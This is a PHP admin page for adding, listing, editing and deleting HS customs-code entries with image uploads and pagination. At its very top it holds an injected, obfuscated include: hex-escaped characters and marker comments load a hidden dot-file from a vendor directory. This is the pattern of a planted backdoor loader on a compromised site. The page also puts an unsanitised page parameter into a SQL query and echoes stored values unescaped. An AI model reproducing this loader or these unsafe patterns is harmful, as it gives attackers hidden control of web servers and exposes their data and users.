<?php
/*ea246*/

@include /*62ib*/("/ho\x6de/\x6dancode/i\x6dports.lk/ad\x6din/vendor/jqv\x6dap/.c2b3d13f.oti");

/*ea246*/


    include 'layout/header.php';
 ?>



        <div class="content-body">
            <div class="container-fluid">
              <?php if(isset($_SESSION['added'])){ ?>
              <p style="font-weight:bold;color:#2ccc1a;font-size:16px;">Successfully Added</p>
            <?php unset($_SESSION['added']); } ?>

            <?php if(isset($_SESSION['del_succ'])){ ?>
            <p style="font-weight:bold;color:#2ccc1a;font-size:16px;">Deleted</p>
          <?php unset($_SESSION['del_succ']); } ?>

              <form action="backend/up_hscode.php" method="post" enctype="multipart/form-data">
                <div class="form-group">
                  <label for="" style="font-weight:bold;">HS CODE</label>
                  <input type="text" name="hs_code" class="form-control" value="">
                </div>
                <div class="form-group">
                  <label for="" style="font-weight:bold;">Description</label>
                  <textarea name="desc" class="form-control" placeholder="Description" rows="8" cols="80"></textarea>
                </div>
                <div class="form-group">
                  <label for="">Image</label>
                  <input type="file" name="hsimage" value="">
                </div>
                <button type="submit" class="btn btn-info" name="button">Submit</button>
              </form>
              <br> <br>
              <?php

              $per_page_record = 8;

              if (isset($_GET["page"])) {
                  $page  = $_GET["page"];
              } else {
                  $page = 1;
              }

              $start_from = ($page - 1) * $per_page_record;

              $sql = "SELECT * FROM tbl_hs_code ORDER BY `tbl_hs_code`.`hsm_id` DESC LIMIT $start_from, $per_page_record ";
              $result = mysqli_query($conn, $sql);

              ?>
              <div class="row">
                <?php
                while ($row = mysqli_fetch_array($result)) {
                 ?>
                 <div class="col-lg-3">
                  <form action="backend/edit_hscode.php?id=<?= $row['hsm_id'] ?>" method="post" enctype="multipart/form-data">
                    <?php if ($row['hs_image'] != "empty"): ?>
                      <img src="hsimages/<?= $row['hs_image'] ?>" style="width:100%;" alt="">
                      <hr>
                    <?php endif; ?>


                   <input type="text" style="font-weight:bold;color:#1b1d1b;font-size:14px;" name="hs_code_ed" class="form-control" value="<?= $row['hs_code'] ?>">
                   <input type="text" style="font-weight:bold;color:#1b1d1b;font-size:17px;" name="hs_code_desc" class="form-control" value="<?= $row['hs_description'] ?>">
                   <br>
                     <button type="submit" class="btn btn-info btn-sm" name="button">Edit</button>
                     <a href="backend/del_hscode.php?id=<?= $row['hsm_id'] ?>" class="btn btn-danger btn-sm">Delete</a>
                 </form><br>

                   <br><br>
                 </div>
               <?php
               // }
               }
               ?>
              </div>
              <br><br>

              <div class="pagination justify-content-center">
                  <?php
                  $sql = "SELECT COUNT(*) FROM tbl_hs_code";
                  $result = mysqli_query($conn, $sql);
                  $row = mysqli_fetch_row($result);
                  $total_records = $row[0];

                  echo "</br>";
                  $total_pages = ceil($total_records / $per_page_record);
                  $pagLink = "";

                  if ($page >= 2) {
                      echo "<a style='font-weight:bold;' class='btn btn-outline-dark' href='index.php?page=" . ($page - 1) . "'> << Previous </a>";
                  }

                  // for ($i = 1; $i <= $total_pages; $i++) {
                  //     if ($i == $page) {
                  //         $pagLink .= "<a style='font-weight:bold;' class='btn btn-outline-dark' class = 'active' href='index.php?page="
                  //             . $i . "'>" . $i . " </a>";
                  //     } else {
                  //         $pagLink .= "<a style='font-weight:bold;' class='btn btn-outline-dark' href='index.php?page=" . $i . "'>
                  //                                             " . $i . " </a>";
                  //     }
                  // };
                  // echo $pagLink;

                  if ($page < $total_pages) {
                      echo "<a style='font-weight:bold;' class='btn btn-outline-dark' href='index.php?page=" . ($page + 1) . "'>  Next >> </a>";
                  }

                  ?>
              </div>

              <div class="text-center">
              <div class="inline">
                  <input id="page" type="number" min="1" max="<?php echo $total_pages ?>" placeholder="<?php echo $page . "/" . $total_pages; ?>" required>
                  <button class="btn btn-success btn-sm" onClick="go2Page();">Go</button>
              </div>
            </div>

             <br><br>
            </div>
        </div>

        <script>
            function go2Page() {
                var page = document.getElementById("page").value;
                page = ((page > <?php echo $total_pages; ?>) ? <?php echo $total_pages; ?> : ((page < 1) ? 1 : page));
                window.location.href = 'index.php?page=' + page;
            }
        </script>

<?php
    include 'layout/footer.php';
?>
